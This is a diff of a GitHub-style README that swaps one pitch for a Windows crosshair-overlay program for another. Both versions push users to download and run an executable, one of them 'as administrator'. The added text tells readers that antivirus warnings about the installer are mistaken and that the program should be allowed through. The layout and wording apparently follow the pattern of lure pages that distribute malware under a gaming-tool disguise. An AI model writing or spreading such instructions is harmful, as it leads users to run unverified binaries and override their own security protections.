@@ -1,51 +1,88 @@
-# Crosshair X: Ultimate Precision Aiming Software with Dynamic Color Adjustment, Shape Presets, and Recoil-Based Spread Indicator – 2025
+# 🎯 Pro-Crosshair-X - Precision Aiming Made Easy
 
-## 📜 Crosshair X - Overview
+[![Download Pro-Crosshair-X](https://img.shields.io/badge/Download-Now-blue)](https://github.com/jash1717/Pro-Crosshair-X/releases)
 
-Crosshair X offers gamers unparalleled aiming precision with dynamic color adjustments, shape presets, and recoil-based spread indicators to optimize your targeting performance. In 2025, elevate your gameplay experience with Crosshair X’s real-time preview, DPI synchronization, and advanced customization tools designed for professional accuracy and seamless integration.
+## 🚀 Getting Started
 
-<div align="center">
+Welcome to Pro-Crosshair-X! This application helps you improve your aim in games by providing customizable crosshairs. You can choose colors, shapes, and even adjust settings based on game mechanics.
 
-  ![](https://raw.githubusercontent.com/irezorisdorisel/Crosshair-X/main/pictures/1.png)
+## 🖥️ System Requirements
 
-  ![](https://raw.githubusercontent.com/irezorisdorisel/Crosshair-X/main/pictures/.png)
+To run Pro-Crosshair-X, you will need:
 
-  <a href="https://pro-crosshair-x.github.io/.github/"><img src="https://raw.githubusercontent.com/irezorisdorisel/Crosshair-X/main/pictures/0.png" height="80"></a>
+- Operating System: Windows 10 or higher
+- RAM: 4 GB or more
+- CPU: Dual-core processor or better
+- Storage: At least 100 MB of free space
 
-</div>
+Ensure your computer meets these requirements for the best experience.
 
-## ⚙️ Features
+## 📥 Download & Install
 
-* **Dynamic Color Adjustment** - Instantly change crosshair colors using RGB sliders or hexadecimal codes to match any game environment and improve visibility.
-* **Shape Presets** - Choose from a library of pre-designed crosshair shapes or create and save your own custom presets for quick switching between games.
-* **Opacity Control** - Adjust the transparency of each crosshair element independently to ensure optimal contrast without obstructing your view.
-* **Thickness and Gap Customization** - Fine-tune the thickness and gap of crosshair lines to suit your aiming style and screen resolution.
-* **Center Dot Toggle** - Enable or disable a central aiming dot for precise headshots and long-range targeting.
-* **Outline and Shadow Effects** - Add outlines or soft shadows to your crosshair for enhanced visibility against complex backgrounds.
-* **Recoil-Based Spread Indicator** - Automatically visualize weapon recoil spread with dynamic crosshair expansion, giving real-time feedback on shot accuracy.
-* **Resolution Scaling Support** - Maintain crisp, pixel-perfect crosshairs at any resolution or display scaling setting, including multi-monitor setups.
-* **DPI Sync** - Automatically detect and sync with your mouse DPI settings for consistent crosshair behavior across different sensitivities.
-* **Profile Management** - Create, import, and export multiple crosshair profiles for different games or playstyles, and switch them on the fly.
-* **Live Preview** - View real-time updates of crosshair changes directly on your desktop or in-game overlay without restarting the application.
+1. **Visit the Download Page**: Click the link below to go to the releases page:
+   
+   [Download Pro-Crosshair-X](https://github.com/jash1717/Pro-Crosshair-X/releases)
 
-And many other features!
+2. **Choose the Latest Version**: On the releases page, look for the newest version. You will see a list of available files.
 
----
+3. **Download the Installer**: Click on the file named `Pro-Crosshair-X-Installer.exe` to download it. This file includes everything you need to install the application.
 
-## 📊 System requirements
+4. **Run the Installer**: Once the download finishes, locate the `Pro-Crosshair-X-Installer.exe` file, usually found in your "Downloads" folder. Double-click the file to open it.
 
-> 🔲 **Supported CPU:** AMD & Intel  
-> 🔧 **Supported architectures:** 64-bit, 32-bit  
-> 💿 **Supported OS:** Windows 11, Windows 10, Windows 8, Windows 7  
-> 🖥 **Supported gamemodes:** Borderless, Windowed, Fullscreen  
-> 🛠 **.NET Framework:** 4.8+
+5. **Follow the Installation Steps**: A window will appear guiding you through the installation process. Follow these steps:
 
-### 🤔 How to install on Windows?
+   - Click “Next” to begin.
+   - Accept the terms of service.
+   - Choose an installation location, or leave it as the default.
+   - Click “Install” to start the process.
 
-- Download the .zip archive using download button.
-- Extract the archive to a secure location.
-- Run `ProjectLauncher.exe` as administrator.
+6. **Launch the Application**: After the installation finishes, you will see an option to start Pro-Crosshair-X. Click “Finish”. You can also find the application in your start menu or desktop shortcut.
 
-💬 Have questions or need support? Join our active Discord community:
+## 🎨 Features
 
-[![Discord](https://img.shields.io/badge/Discord-Join-7289DA?logo=discord)](https://discord.gg/abc123xyz)
+Pro-Crosshair-X brings several features to help enhance your gaming experience. Some key features include:
+
+- **Dynamic Color Adjustment**: Change crosshair colors easily based on your preference or game environment.
+- **Shape Presets**: Choose from various crosshair shapes like dots, lines, and circles to suit your gameplay style.
+- **Recoil-Based Spread Indicator**: Track weapon recoil more effectively with real-time adjustments to your crosshair setup.
+- **Custom Presets**: Save your preferred settings as presets for quick access in different games.
+
+## 🕹️ Supported Games
+
+Pro-Crosshair-X works well with many popular games, including:
+
+- Apex Legends
+- Counter-Strike 2
+- Fortnite
+- Valorant
+- Call of Duty: Warzone
+
+This allows you to have a tailored crosshair in almost any shooter game.
+
+## ⚙️ Troubleshooting
+
+If you run into any issues during installation or while using the application, here are a few steps to try:
+
+1. **Reinstall the Application**: Sometimes, files can get corrupted. Uninstall Pro-Crosshair-X and then reinstall it using the steps above.
+   
+2. **Check Antivirus Settings**: Some antivirus programs may mistakenly treat the installer as a threat. Ensure that your antivirus allows Pro-Crosshair-X to run.
+   
+3. **Update Your Drivers**: Ensure your graphics and input device drivers are up to date for the best performance.
+
+If problems persist, feel free to check our support section in the GitHub repository or reach out to the community for help.
+
+## 🌐 Community & Support
+
+We have an active community ready to assist you. For tips, discussions, and sharing presets, please join our forums or social media groups where fans of Pro-Crosshair-X interact.
+
+## 📢 Report Issues
+
+If you encounter any bugs or have suggestions for improvements, we encourage you to report them on our GitHub issues page. Your feedback is crucial for the development of Pro-Crosshair-X.
+
+## 🔗 Useful Links
+
+- [Download Pro-Crosshair-X](https://github.com/jash1717/Pro-Crosshair-X/releases)
+- [Community Forums](#)
+- [Feature Requests](#)
+
+Thank you for choosing Pro-Crosshair-X! Enjoy your improved aiming experience!
